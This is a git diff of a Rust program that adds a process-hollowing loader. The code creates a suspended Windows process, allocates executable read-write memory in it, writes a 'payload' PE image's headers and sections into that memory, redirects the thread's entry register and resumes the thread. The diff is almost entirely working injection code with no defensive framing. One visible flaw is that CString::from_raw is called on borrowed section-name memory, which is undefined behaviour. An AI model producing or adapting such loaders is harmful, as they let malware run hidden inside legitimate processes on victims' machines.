@@ -1,4 +1,5 @@
 use std::{
+    ffi::CString,
     fs::{self, File},
     io::Read,
     mem::zeroed,
@@ -12,11 +13,15 @@ use windows_sys::{
         Threading::{NtQueryInformationProcess, ProcessWin32kSyscallFilterInformation},
     },
     Win32::System::{
-        Diagnostics::Debug::{IMAGE_NT_HEADERS64, ReadProcessMemory},
+        Diagnostics::Debug::{
+            CONTEXT, GetThreadContext, IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+            ReadProcessMemory, SetThreadContext, WriteProcessMemory,
+        },
+        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
         SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
         Threading::{
             CREATE_SUSPENDED, CreateProcessA, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
-            STARTUPINFOA,
+            ResumeThread, STARTUPINFOA,
         },
     },
 };
@@ -134,12 +139,95 @@ fn main() {
             return;
         }
 
-        let nt_headers = (buffer.as_ptr() as usize).add((*dos_header).e_lfanew as usize)
-            as *const IMAGE_NT_HEADERS64;
+        let nt_headers =
+            (buffer.as_ptr()).add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
 
         if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
             println!("[-] Invalid NT signature in payload");
             return;
         }
+
+        let size_of_image = (*nt_headers).OptionalHeader.SizeOfImage;
+
+        let address_of_entry_point = (*nt_headers).OptionalHeader.AddressOfEntryPoint;
+
+        let remote_buffer = VirtualAllocEx(
+            pi.hProcess,
+            null_mut(),
+            size_of_image as usize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
+        if remote_buffer.is_null() {
+            println!("[-] Failed to allocate memory in target process");
+            return;
+        }
+
+        let headers_size = (*nt_headers).OptionalHeader.SizeOfHeaders;
+        let mut bytes_written = 0;
+        if WriteProcessMemory(
+            pi.hProcess,
+            remote_buffer,
+            buffer.as_ptr() as *const _,
+            headers_size as usize,
+            &mut bytes_written,
+        ) == 0
+        {
+            println!("[-] Failed to write headers to target process");
+            return;
+        }
+
+        let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
+        let opt_header_size = (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
+        let first_section = (nt_headers as *const u8)
+            .add(4 + size_of::<IMAGE_FILE_HEADER>() + opt_header_size)
+            as *const IMAGE_SECTION_HEADER;
+
+        for i in 0..number_of_sections {
+            let sec_name =
+                CString::from_raw((*first_section.add(i as usize)).Name.as_ptr() as *mut i8)
+                    .into_string()
+                    .unwrap();
+
+            println!("[+] Writing section {} to target process", sec_name);
+
+            let section = first_section.add(i as usize);
+            let virtual_addr = (*section).VirtualAddress;
+            let size_of_raw_data = (*section).SizeOfRawData;
+            let pointer_to_raw_data = (*section).PointerToRawData;
+
+            if size_of_raw_data == 0 {
+                continue;
+            }
+
+            if WriteProcessMemory(
+                pi.hProcess,
+                (remote_buffer as usize + virtual_addr as usize) as *mut _,
+                buffer.as_ptr().add(pointer_to_raw_data as usize) as *const _,
+                size_of_raw_data as usize,
+                &mut bytes_written,
+            ) == 0
+            {
+                println!("[-] Failed to write section {} to target process", sec_name);
+                return;
+            }
+        }
+
+        let mut ctx = zeroed::<CONTEXT>();
+
+        if GetThreadContext(pi.hThread, &mut ctx) == 0 {
+            println!("[-] Failed to get thread context");
+            return;
+        }
+
+        ctx.Rcx = (remote_buffer as *const u8).add(address_of_entry_point as usize) as u64;
+
+        if SetThreadContext(pi.hThread, &ctx) == 0 {
+            println!("[-] Failed to set thread context");
+            return;
+        }
+
+        ResumeThread(pi.hThread);
     }
 }
